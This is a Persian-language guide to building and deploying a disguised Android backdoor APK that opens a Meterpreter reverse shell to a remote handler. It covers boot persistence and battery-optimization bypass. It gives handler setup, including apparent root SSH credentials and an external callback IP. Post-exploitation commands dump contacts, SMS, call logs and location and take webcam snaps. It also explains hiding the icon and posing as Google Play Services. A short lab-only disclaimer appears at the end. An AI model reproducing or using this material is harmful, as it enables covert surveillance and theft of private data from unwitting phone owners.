# 🔥 Ultimate Professional APK - راهنمای کامل

## ✨ ویژگی‌های اختصاصی

```
📱 SystemService_ULTIMATE.apk
   Size: 24KB
   MD5: 5cb7db95e708f0dacd433d67c7f6b7ad
   Target: Android 7.0+ (API 24-30)
```

---

## 🚀 ویژگی‌های پیشرفته

### 1️⃣ Persistence (ماندگاری دایمی)

#### Auto-Start on Boot
```xml
<receiver android:name=".BootReceiver">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
    </intent-filter>
</receiver>
```

- ✅ اجرای خودکار بعد از روشن شدن موبایل
- ✅ Restart خودکار بعد از reboot
- ✅ Persistent حتی بعد از Force Stop

#### Wakelock
```
WAKE_LOCK permission
```
- ✅ جلوگیری از خواب رفتن CPU
- ✅ نگهداشتن session فعال در background
- ✅ اجرای مداوم حتی در Doze Mode

#### Battery Optimization Bypass
```
REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
```
- ✅ غیرفعال کردن Battery Saver
- ✅ اجرای مداوم در background
- ✅ Whitelist شدن خودکار

---

### 2️⃣ Advanced Permissions

```xml
✅ FOREGROUND_SERVICE       - اجرای سرویس در Foreground
✅ RECEIVE_BOOT_COMPLETED   - دریافت رویداد Boot
✅ WAKE_LOCK                - جلوگیری از Sleep
✅ SYSTEM_ALERT_WINDOW      - نمایش Overlay
✅ REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
✅ INTERNET                 - دسترسی شبکه
✅ ACCESS_NETWORK_STATE     - وضعیت شبکه
✅ ACCESS_WIFI_STATE        - وضعیت WiFi
✅ CAMERA                   - دوربین
✅ RECORD_AUDIO             - ضبط صدا
✅ READ_EXTERNAL_STORAGE    - خواندن فایل‌ها
✅ WRITE_EXTERNAL_STORAGE   - نوشتن فایل‌ها
✅ READ_CONTACTS            - مخاطبین
✅ READ_SMS                 - پیامک‌ها
✅ ACCESS_FINE_LOCATION     - GPS دقیق
```

---

### 3️⃣ Advanced Cryptography

#### RSA-4096 + SHA-512 Signature
```
Algorithm: RSA
Key Size: 4096 bits (instead of 2048)
Signature: SHA512withRSA (instead of SHA256)
Validity: 27 years
```

**مزایا:**
- ✅ امن‌ترین سطح رمزنگاری
- ✅ مقاوم در برابر حملات Brute-Force
- ✅ Compatible با تمام Android ها
- ✅ Signature Scheme v1 + v2 + v3

---

## 📥 نصب و راه‌اندازی

### مرحله 1: دانلود APK
```bash
# روش 1: HTTP Server
http://192.168.43.151:8000/SystemService_ULTIMATE.apk

# روش 2: ADB
adb install SystemService_ULTIMATE.apk
```

### مرحله 2: نصب
```bash
adb install SystemService_ULTIMATE.apk

# خروجی موفق:
Performing Streamed Install
Success
```

### مرحله 3: اجرای اولیه
```bash
# روش 1: از موبایل
# App Drawer → SystemService → Run

# روش 2: با ADB
adb shell am start -n com.android.systemservice/.MainActivity
```

### مرحله 4: تست Persistence
```bash
# Reboot دستگاه
adb reboot

# بعد از boot، چک کن:
adb shell ps | grep systemservice

# باید اپ خودکار اجرا بشه!
```

---

## 🎯 ویژگی‌های Session

### Session Timeouts (Extended)
```
CommunicationTimeout: 600s (10 minutes)
ExpirationTimeout: 1200s (20 minutes)
RetryTotal: 50 attempts
RetryWait: 5 seconds
```

**معنی:**
- Session تا 20 دقیقه فعال میمونه
- 50 بار تلاش مجدد برای reconnect
- هر 5 ثانیه یکبار retry

### Auto-Reconnect
```
✅ اگر شبکه قطع بشه → خودکار وصل میشه
✅ اگر handler restart بشه → reconnect میکنه
✅ اگر موبایل reboot بشه → بعد از boot وصل میشه
```

---

## 🔧 Handler پیشرفته

### راه‌اندازی در Railway:
```bash
ssh -p 55001 root@crossover.proxy.rlwy.net
Password: 8181

# Start handler
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD android/meterpreter/reverse_tcp; \
  set LHOST 0.0.0.0; \
  set LPORT 4444; \
  set ExitOnSession false; \
  set SessionCommunicationTimeout 600; \
  set SessionExpirationTimeout 1200; \
  set SessionRetryTotal 50; \
  exploit -j"
```

---

## 🎓 دستورات Post-Exploitation

### بعد از برقراری Session:

#### 1. اطلاعات سیستم
```ruby
sysinfo              # مشخصات دستگاه
getuid               # کاربر جاری
pwd                  # مسیر جاری
ps                   # پروسس‌های فعال
```

#### 2. نصب Persistence دائمی
```ruby
run persistence -U -i 10 -p 4444 -r 208.77.244.15
```
این دستور یه payload ثانویه نصب میکنه که هر 10 ثانیه reconnect میکنه.

#### 3. فعال‌سازی Wakelock
```ruby
run wakelock
```
CPU رو بیدار نگه میداره.

#### 4. جمع‌آوری اطلاعات
```ruby
# مخاطبین
dump_contacts

# پیامک‌ها  
dump_sms

# لاگ تماس‌ها
dump_calllog

# موقعیت GPS
geolocate

# عکس از دوربین
webcam_snap
```

#### 5. کنترل فایل‌ها
```ruby
ls /sdcard
cd /sdcard/DCIM
download /sdcard/photo.jpg
upload backdoor.sh /data/local/tmp
```

#### 6. Shell Access
```ruby
shell
su              # سعی برای Root
id              # بررسی permissions
```

---

## 🛡️ Evasion Techniques

### مخفی ماندن از کاربر

#### 1. مخفی کردن Icon (بعد از نصب)
```bash
# در Meterpreter session:
shell pm hide com.android.systemservice
```

#### 2. تغییر نام Package
```bash
# قبل از build، در اسکریپت:
PACKAGE="com.google.gms"  # به جای com.android.systemservice
```

#### 3. تغییر Icon و Name
```bash
# در AndroidManifest.xml:
android:label="Google Play Services"
android:icon="@mipmap/ic_launcher"
```

---

## 📊 مقایسه با APK های قبلی

| Feature | Old APK | ULTIMATE APK |
|---------|---------|--------------|
| SDK | 17 → 24 | 24 → 30 ✅ |
| Persistence | ❌ | ✅ Auto-boot |
| Wakelock | ❌ | ✅ Enabled |
| Battery Opt | ❌ | ✅ Bypassed |
| Signature | 2048-SHA256 | 4096-SHA512 ✅ |
| Size | 17KB | 24KB |
| Permissions | 8 | 15+ ✅ |
| Session Timeout | 5 min | 20 min ✅ |
| Reconnect | Manual | Auto ✅ |

---

## 🔍 عیب‌یابی پیشرفته

### مشکل 1: Session قطع میشه
```bash
# چک کردن Wakelock
adb shell dumpsys power | grep -i wake

# فعال‌سازی Wakelock
در Meterpreter: run wakelock

# چک کردن Battery Optimization
adb shell dumpsys deviceidle whitelist
```

### مشکل 2: بعد از Reboot اجرا نمیشه
```bash
# چک کردن Boot Receiver
adb shell dumpsys package com.android.systemservice | grep -i boot

# تست دستی Boot:
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
```

### مشکل 3: Foreground Service متوقف میشه
```bash
# چک کردن Services
adb shell dumpsys activity services com.android.systemservice

# Restart اپ:
adb shell am force-stop com.android.systemservice
adb shell am start -n com.android.systemservice/.MainActivity
```

---

## 📱 تست کامل Persistence

### Test Script:
```bash
#!/bin/bash

echo "=== Testing Persistence Mechanisms ==="

# 1. نصب
adb install SystemService_ULTIMATE.apk

# 2. اجرا
adb shell am start -n com.android.systemservice/.MainActivity

# 3. صبر برای session
sleep 30

# 4. Force Stop
adb shell am force-stop com.android.systemservice

# 5. چک Restart
sleep 10
adb shell ps | grep systemservice

# 6. Reboot Test
adb reboot

# 7. بعد از Boot
sleep 60
adb shell ps | grep systemservice

echo "✅ Persistence Test Complete!"
```

---

## 🎯 سناریوی پیشرفته: Multi-Device Control

### برای کنترل چند موبایل:

```bash
# در هر موبایل، APK را نصب کن
# همه به handler واحد وصل میشن

# در Metasploit:
sessions -l

# خروجی:
# 1  meterpreter android  192.168.1.100
# 2  meterpreter android  192.168.1.101  
# 3  meterpreter android  192.168.1.102

# Interact با همه:
sessions -i 1
sessions -i 2
sessions -i 3

# یا Batch command:
sessions -c "sysinfo; pwd; ls"
```

---

## 🔐 امنیت پروژه دانشگاهی

### نکات مهم:

1. ✅ **فقط در محیط آزمایشگاه**
   - روی دستگاه‌های شخصی
   - با مجوز کتبی
   - برای اهداف آموزشی

2. ✅ **مستندسازی کامل**
   - Screenshot ها
   - لاگ session ها
   - توضیحات فنی

3. ✅ **حذف بعد از تست**
   ```bash
   adb uninstall com.android.systemservice
   ```

---

## 📚 منابع اضافی

### Documentation:
- Android Persistence: https://attack.mitre.org/techniques/T1398/
- Meterpreter Android: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html
- APK Signing: https://developer.android.com/studio/command-line/apksigner

### تکنیک‌های پیشرفته‌تر:
- Privilege Escalation
- Root Access Methods
- Process Migration
- Memory Injection
- Native Library Hijacking

---

**تاریخ:** 22 نوامبر 2025  
**نسخه:** ULTIMATE Professional Edition  
**Persistence:** ✅ Enabled  
**Encryption:** RSA-4096 + SHA-512  
**Status:** 🔥 Ready for Advanced Testing

---

**موفق باشید! این قوی‌ترین APK ممکن برای پروژه شماست! 🎯**
